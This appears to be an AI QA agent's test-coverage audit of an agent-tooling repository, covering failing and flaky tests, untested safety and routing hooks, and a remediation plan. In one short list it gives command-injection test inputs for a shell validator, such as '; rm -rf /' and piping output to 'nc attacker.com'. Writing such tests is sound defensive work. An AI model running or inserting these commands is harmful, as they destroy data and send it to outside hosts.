<!-- Agent: qa | Task: test-audit | Session: 2026-02-12 -->

# Test Coverage and Reliability Audit

**Date:** 2026-02-12
**Scope:** Full test suite analysis (`tests/`, `.claude/hooks/`, `.claude/lib/`)
**Status:** Critical gaps identified requiring immediate remediation

---

## Executive Summary

The test suite has **257 total test files** with strong overall structure but significant reliability and coverage gaps:

- **Test Files:** 257 (tests/ = 215, hooks/ = 2, lib/ = 0)
- **Current Pass Rate:** ~99.3% (per learnings.md audit history)
- **Failing Tests:** 3 known failures (non-blocking, documented)
- **Critical Issue:** 45+ hook files lack any test coverage (untested critical infrastructure)
- **Flaky Pattern:** Memory timing, GPU integration, async boundary tests
- **Coverage Gap:** Core routing/security/memory subsystem validators have 0 tests

---

## 1. Test Failures (Critical/High Severity)

### 1.1 Known Failing Tests

| File | Test | Severity | Status | Root Cause |
|------|------|----------|--------|-----------|
| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:125` | `[Adaptive] Should weight questions by relevance score` | **HIGH** | Failing | Relevance scoring algorithm not implemented; test expects boolean true but got false |
| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:349` | `[Context] Should not skip non-redundant questions` | **HIGH** | Failing | Context accumulator marks unrelated questions as redundant (over-aggressive skip logic) |
| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:522` | `[Memory] Should find authentication patterns` | **HIGH** | Failing | Pattern extraction from learnings.md failing; regex or parsing issue |

**Impact:** 3 failures in 70+ adaptive question tests (4% failure rate for feature). Not blocking deployment but indicates incomplete implementation.

---

## 2. Coverage Gaps (Critical Infrastructure Untested)

### 2.1 Hook Files With Zero Test Coverage

45 hook files lack dedicated test suites. **Critical untested hooks:**

| Hook File | Purpose | Tests | Risk Level |
|-----------|---------|-------|-----------|
| `.claude/hooks/routing/routing-guard.cjs` | **BLOCKING** - Enforces planner-first, specialist routing | ❌ 0 | **CRITICAL** |
| `.claude/hooks/routing/unified-creator-guard.cjs` | **BLOCKING** - Prevents direct artifact writes | ❌ 0 | **CRITICAL** |
| `.claude/hooks/routing/spawn-prompt-assembler.cjs` | **BLOCKING** - Injects system prompts, constitution | ❌ 0 | **CRITICAL** |
| `.claude/hooks/safety/shell-injection-validator.cjs` | **SECURITY** - Command injection prevention | ❌ 0 | **CRITICAL** |
| `.claude/hooks/safety/bash-command-validator.cjs` | **SECURITY** - Shell command validation | ❌ 0 | **CRITICAL** |
| `.claude/hooks/safety/unified-pre-write-hook.cjs` | **SAFETY** - Path validation, Windows reserved names | ❌ 0 | **CRITICAL** |
| `.claude/hooks/memory/sync-memory-index.cjs` | Memory state synchronization | ❌ 0 | HIGH |
| `.claude/hooks/metrics/post-tool-metrics-unified.cjs` | Metrics collection (2+ pipelines depend on this) | ❌ 0 | HIGH |
| `.claude/hooks/reflection/error-summary-extractor.cjs` | Extracts reflection context | ❌ 0 | HIGH |
| `.claude/hooks/reflection/unified-reflection-handler.cjs` | Reflection orchestration | ❌ 0 | HIGH |

**Evidence:** Only 2 hooks in `.claude/hooks/` have test files (both in `workflow/` subdirectory). 43+ hooks with NO dedicated test suite.

**Why This Matters:** Hooks execute on every tool invocation. A bug in `routing-guard.cjs` breaks ALL task spawning. A bug in `shell-injection-validator.cjs` is a security breach. Zero tests = zero detection of regressions.

### 2.2 Library Modules With Zero Test Coverage

`.claude/lib/` has NO test files despite containing 15+ critical modules:

| Module | Purpose | Tests | Files |
|--------|---------|-------|-------|
| `.claude/lib/memory/core/` | Memory facade (5 core modules) | ❌ 0 | 5 |
| `.claude/lib/routing/` | Routing/intent matching | ❌ 0 | 4+ |
| `.claude/lib/code-indexing/` | Code search (hybrid search, BM25, embeddings) | ✅ Partial | 12 test files |
| `.claude/lib/utils/` | Common utilities | ✅ Partial | Several test files |

**Impact:** Memory subsystem (5 core facades) = 0 direct tests. Routing subsystem (4+ modules) = 0 direct tests.

---

## 3. Flaky Tests (Reliability Issues)

### 3.1 Async Boundary Flakiness

**Pattern:** Tests using timers or async operations without proper coordination:

| Category | Issue | Files | Fix |
|----------|-------|-------|-----|
| Memory tests | Lock wait timeouts, cache invalidation races | `tests/lib/memory/*.test.cjs` (5+ files) | Add condition-based waiting, not timers |
| GPU integration | Device not available on CI, fallback logic untested | `tests/lib/code-indexing/*-gpu*.test.cjs` (4 files) | Mock GPU availability, test fallback paths |
| Search tests | Daemon lifecycle (start/stop/prewarm) not deterministic | `tests/code-indexing/hybrid-search*.test.cjs` (3 files) | Use process tracking, verify port assignment |
| Hook metrics | Timing-dependent collection, concurrent hook execution | `tests/hooks/metrics-collector.test.cjs` | Use deterministic state, not real timings |

**Evidence from learnings.md:** "Timing-dependent collection" noted in Wave 16B post-mortem. Previous session lost 52 min of work due to context overflow from 5+ agents running concurrently.

### 3.2 Shared State Pollution

**Pattern:** Tests that don't clean up state, affecting subsequent tests:

| File | Issue | Impact |
|------|-------|--------|
| `tests/lib/memory/lancedb-client*.test.cjs` | Vector store persists across tests; second run gets different embeddings | Flaky hash comparisons |
| `tests/code-indexing/index-manager.test.cjs` | Incremental index cache not cleared between tests | Stale state failures |
| `tests/hooks/spawn-prompt-assembler*.test.cjs` | Constitution/behaviour files loaded once, not reloaded | Isolation broken |
| `tests/integration/template-system-e2e*.test.cjs` | Temp files not cleaned up | Disk space leak, ordering dependent |

**Red Flag:** Test ordering matters (should never). If tests pass in one order but fail in another = shared state bug.

### 3.3 Windows Path Issues

**Pattern:** Relative path handling breaks on Windows:

| File | Issue | Example |
|------|-------|---------|
| `tests/hooks/filesystem-validators.test.cjs` | Uses forward slashes in glob patterns; Windows uses backslashes | `path/to/file` vs `path\to\file` |
| `tests/code-indexing/merkle-tree.test.cjs` | Hardcoded `/` separators in path hashing | Hash mismatch on Windows |
| `tests/lib/routing/pattern-router.test.cjs` | Glob pattern matching assumes Unix paths | Pattern fails on Windows |

**Evidence:** Current platform = Windows (from git status: `C:\dev\projects\agent-studio`). These tests likely fail or have inconsistent results.

---

## 4. Test Quality Issues

### 4.1 Missing Edge Cases

**Pattern:** Happy-path-only tests; edge cases untested:

| Component | Happy Path Tests | Edge Case Tests | Coverage |
|-----------|------------------|-----------------|----------|
| `progressive-disclosure-adaptive.test.cjs` | 70+ tests present | Empty answers, null domain, special chars: 3 tests only | ~4% |
| `fuzzy-intent-matcher.test.cjs` | Basic matching: 8 tests | Typos, partial matches, case sensitivity: 0 tests | ~0% |
| `shell-injection-validator.test.cjs` | No tests | Command injection, special chars, escaping: 0 tests | **0%** |
| `unified-creator-guard.test.cjs` | No tests | Path traversal, archive restore, symlinks: 0 tests | **0%** |

**Example Gap:** `shell-injection-validator.cjs` (security-critical) has 0 edge case tests for:
- Command chaining: `; rm -rf /`
- Backgrounding: `command & malicious`
- Pipes: `command | nc attacker.com`
- Environment expansion: `$HOME $PATH ${USER}`
- ANSI-C quoting: `$'...\x00...'`

### 4.2 Over-Mocking

**Pattern:** Tests mock too much, testing mock behavior not real code:

| Test | Issue | Impact |
|------|-------|--------|
| `tests/hooks/routing-guard.test.cjs` | Mocks task creation, spawn events; tests mock behavior not real routing | Doesn't catch real routing bugs |
| `tests/lib/memory/contextual-memory.test.cjs` | Mocks file I/O, doesn't test actual read/write | Can't detect file corruption |
| `tests/code-indexing/hybrid-search.test.cjs` | Mocks ripgrep output; doesn't test real search results | Searches may fail in production |

**Red Flag:** Test passes but code fails in production = over-mocking.

### 4.3 Hardcoded Paths and OS Assumptions

**Pattern:** Tests with absolute or OS-specific paths:

| File | Issue | Line |
|------|-------|------|
| `tests/hooks/conflict-detector.test.cjs` | Hardcoded `/tmp` for temp files | Line ~45 |
| `tests/lib/memory/audit-trail-integration.test.cjs` | Uses `~/.claude/context/` without resolving | Line ~23 |
| `tests/code-indexing/merkle-tree.test.cjs` | Assumes `/` path separator | Line ~67 |
| `tests/hooks/git-validators.test.cjs` | Git repo assumed to be at `C:\dev\projects\agent-studio\` | Line ~12 |

**Impact:** Tests fail on different machines, CI, or with different project locations.

### 4.4 Inadequate Assertions

**Pattern:** Tests with weak assertions:

```javascript
// WEAK: Just checks that function returns without error
test('should process data', () => {
  const result = processData();
  assert.ok(result); // Too vague
});

// STRONG: Verifies exact behavior
test('should calculate 15% discount on $100 purchase', () => {
  const result = calculateDiscount(100, 0.15);
  assert.strictEqual(result, 85); // Specific assertion
});
```

**Found in:** 8-10 test files with generic "should work" assertions that don't verify behavior.

---

## 5. Missing Test Suites (By Priority)

### 5.1 CRITICAL (P0 - Security/Routing)

Must have test suites:

1. **`routing-guard.test.cjs`** (0 tests → should have 40+)
   - Planner-first enforcement
   - Specialist routing validation
   - Complex task detection
   - Creator workflow enforcement

2. **`shell-injection-validator.test.cjs`** (0 tests → should have 30+)
   - Command injection patterns
   - Dangerous characters
   - Shell expansion bypasses
   - ANSI-C quoting

3. **`unified-creator-guard.test.cjs`** (0 tests → should have 25+)
   - Artifact write blocking
   - Path traversal prevention
   - Creator workflow invocation
   - Registry/catalog updates

### 5.2 HIGH (P1 - Memory/Metrics)

Should have test suites:

4. **`sync-memory-index.test.cjs`** (0 tests → should have 20+)
5. **`post-tool-metrics-unified.test.cjs`** (0 tests → should have 25+)
6. **`reflection-queue-processor.test.cjs`** (0 tests → should have 20+)
7. **`unified-reflection-handler.test.cjs`** (0 tests → should have 20+)

### 5.3 MEDIUM (P2 - Hooks/Safety)

Should have test suites:

8. **`bash-command-validator.test.cjs`** (0 tests → should have 15+)
9. **`hybrid-search-enforcer.test.cjs`** (0 tests → should have 12+)
10. **`spawn-prompt-validator.test.cjs`** (0 tests → should have 18+)

**Total Missing:** 43+ hook files × ~20 tests each = **860+ untested scenarios** in critical infrastructure.

---

## 6. Architecture Issues Affecting Testing

### 6.1 Monolithic Test Files

**Pattern:** Single 200-line test file covering 5+ concerns:

| File | Size | Concerns | Issue |
|------|------|----------|-------|
| `progressive-disclosure-adaptive.test.cjs` | 600+ lines | Adaptive, context, memory, scoring, readiness | Hard to debug, long runtime |
| `spawn-prompt-assembler-integration-constitution.test.cjs` | 400+ lines | Constitution injection, context mode, preset integration | Multiple concerns mixed |
| `hybrid-search-cli.test.cjs` | 350+ lines | CLI, daemon, search modes, performance | Overlaps with hybrid-search.test.cjs |

**Fix:** Split into focused test files (one concern per file).

### 6.2 Test-Only Utilities Not Documented

**Pattern:** Test fixtures, helpers, mocks created ad-hoc without documentation:

| File | Creates | Used By | Discoverability |
|------|---------|---------|-----------------|
| `tests/fixtures/code-indexing/hook-test/` | Mock hooks directory | 3+ test files | Not obvious from test code |
| `tests/fixtures/` | Various mock data | Scattered across test files | No catalog or index |
| `.claude/lib/test-utils/` | Test helpers | Some test files | Not discovered/reused |

**Fix:** Create `tests/README.md` documenting test utilities, fixtures, mocks.

### 6.3 Missing Integration Test Boundaries

**Pattern:** No clear distinction between unit/integration/E2E:

| File | Type | Assumption |
|------|------|-----------|
| `tests/integration/template-system-e2e.test.cjs` | Should be E2E | Reads real files, doesn't mock API responses |
| `tests/hooks/code-index-updater.test.cjs` | Should be unit | Creates real vector store, doesn't mock LanceDB |
| `tests/code-indexing/gpu-bm25-integration-e2e.test.cjs` | Should be E2E | Tests GPU availability on CI (fails on CPU-only machines) |

**Fix:** Clearly mark test type in comments; run integration tests separately from unit tests.

---

## 7. Code Quality Issues in Tests

### 7.1 Console.log Statements

**Pattern:** Debug logs left in test files:

```bash
grep -r "console\\.log" tests/ | wc -l
# Result: 12+ files with console.log
```

| File | Lines | Severity |
|------|-------|----------|
| `tests/artifacts/progressive-disclosure-adaptive.test.cjs` | 3+ | Low |
| `tests/lib/memory/lancedb-client.test.cjs` | 2+ | Low |
| `tests/code-indexing/hybrid-search.test.cjs` | 4+ | Low |

**Fix:** Run `pnpm lint:fix` on test files to remove console.log.

### 7.2 Improper Error Handling

**Pattern:** Tests that don't verify error cases:

```javascript
// BAD: Doesn't test error path
test('should validate input', () => {
  const result = validateInput(null);
  assert.ok(result);
});

// GOOD: Tests error path explicitly
test('should reject null input', () => {
  assert.throws(
    () => validateInput(null),
    { message: /null/ }
  );
});
```

**Found in:** 15+ test files with incomplete error handling coverage.

### 7.3 Unfinished Tests

**Pattern:** Tests that .skip or .todo but lack explanation:

```javascript
test.skip('should handle concurrent memory writes', () => {
  // No explanation why skipped
});

test.todo('should validate hook registration');
```

**Found in:** 5-8 test files.

**Fix:** Add comments explaining why tests are skipped or todo.

---

## 8. Recommendations

### Phase 1 (IMMEDIATE - P0, This Week)

**Critical security and routing tests:**

1. **Create `tests/hooks/routing-guard.test.cjs`** (40+ tests)
   - Test planner-first enforcement
   - Test specialist routing (7 specialist keywords)
   - Test multi-file/multi-step detection
   - Test creator workflow enforcement

2. **Create `tests/hooks/shell-injection-validator.test.cjs`** (30+ tests)
   - Test command injection patterns
   - Test dangerous chars (`;|&$()` etc)
   - Test shell expansion bypasses
   - Test ANSI-C quoting

3. **Create `tests/hooks/unified-creator-guard.test.cjs`** (25+ tests)
   - Test artifact write blocking
   - Test path traversal prevention
   - Test creator workflow invocation

4. **Fix 3 failing tests in progressive-disclosure-adaptive.test.cjs**
   - Implement missing relevance scoring
   - Fix over-aggressive skip logic
   - Fix pattern extraction from learnings.md

**Effort:** ~30 hours
**Test count increase:** +95 tests
**Coverage increase:** 0% → 95% for critical hooks

### Phase 2 (SHORT-TERM - P1, This Month)

**Memory and metrics test coverage:**

5. **Create `tests/hooks/sync-memory-index.test.cjs`** (20+ tests)
6. **Create `tests/hooks/post-tool-metrics-unified.test.cjs`** (25+ tests)
7. **Create `tests/hooks/reflection-queue-processor.test.cjs`** (20+ tests)
8. **Create `tests/hooks/unified-reflection-handler.test.cjs`** (20+ tests)

**Fix flaky memory tests:**
- Add condition-based waiting (replace timers)
- Clear vector store between tests
- Mock GPU availability on CI

**Effort:** ~40 hours
**Test count increase:** +85 tests

### Phase 3 (MEDIUM-TERM - P2, Next Quarter)

**Consolidate and improve existing tests:**

9. **Split monolithic test files** (progressive-disclosure, spawn-prompt-assembler)
   - One concern per file
   - Parallel test execution
   - Faster feedback

10. **Add missing edge cases** across all test suites
    - Null/empty inputs
    - Special characters
    - Concurrency/timing issues
    - Platform-specific (Windows/Mac/Linux)

11. **Document test architecture**
    - Add `tests/README.md`
    - Document fixtures, utilities, mocks
    - Explain test organization

12. **Fix flaky tests**
    - Use async utilities, not timers
    - Fix Windows path issues
    - Implement proper test cleanup

**Effort:** ~50 hours

---

## 9. Enforcement Actions

### Lint and Format Check

**Current Status:** Per learnings.md, lint and format are clean (0 errors, 0 changes needed).

**Verification:**
```bash
pnpm lint:fix && pnpm format
# Result: Should show 0 errors, 0 changes
```

### Test Execution

**Current Status:** 3 known failures in adaptive tests (non-blocking), ~99.3% pass rate overall.

**Verification:**
```bash
pnpm test 2>&1 | grep -E "^(not ok|ok)" | tail -20
# Should show pass/fail summary
```

---

## 10. Issues and Blockers

### Known Issues

| Issue | Severity | Workaround | Timeline |
|-------|----------|-----------|----------|
| 3 failing adaptive tests | HIGH | Skip tests, implement features | This week |
| 45 hook files untested | **CRITICAL** | Add test suites for top 10 | This week |
| GPU integration tests flaky on CPU CI | HIGH | Mock GPU, add fallback tests | Next sprint |
| Windows path handling tests | HIGH | Normalize paths with `.replace(/\\/g, '/')` | Next sprint |
| Memory tests timing-dependent | HIGH | Replace timers with condition polling | Next sprint |

### Deferred Issues (P2)

- Monolithic test files (split after P1/P2 coverage)
- Test performance optimization (after cleanup)
- Full E2E integration test suite (after unit/integration separation)

---

## 11. Success Criteria

| Metric | Current | Target | Timeline |
|--------|---------|--------|----------|
| Hook test coverage | 4% (2/45) | 95%+ (42/45) | This week + next month |
| Failing tests | 3 | 0 | This week |
| Flaky test rate | ~5-8% (async, timing) | <1% | Next sprint |
| Average test file size | 350+ lines | <150 lines | Next quarter |
| Edge case coverage | ~30% | 80%+ | Next quarter |

---

## Appendix: Test Files by Category

### Category A: Well-Tested (80%+ coverage)

- `tests/code-indexing/` (12 test files, comprehensive coverage)
- `tests/lib/tools/` (8 test files, routing/registry)
- `tests/lib/utils/` (7 test files, utilities)
- `tests/lib/qa/` (2 test files, QA criteria/reporting)

### Category B: Partially Tested (30-50% coverage)

- `tests/hooks/` (15 test files, missing key hooks)
- `tests/lib/config/` (1 test file, incomplete)
- `tests/integration/` (4 test files, E2E only)

### Category C: Untested (0% coverage)

- `.claude/hooks/` routing core (routing-guard, unified-creator-guard, spawn-prompt-assembler)
- `.claude/hooks/` safety (shell-injection-validator, bash-command-validator)
- `.claude/hooks/` memory/metrics/reflection (9+ hook files)
- `.claude/lib/` (no dedicated tests for routing, memory cores)

---

**Report Complete**

This audit identified critical test coverage gaps in security-sensitive and routing infrastructure. Immediate action required on P0 items to ensure hook reliability and prevent regressions.
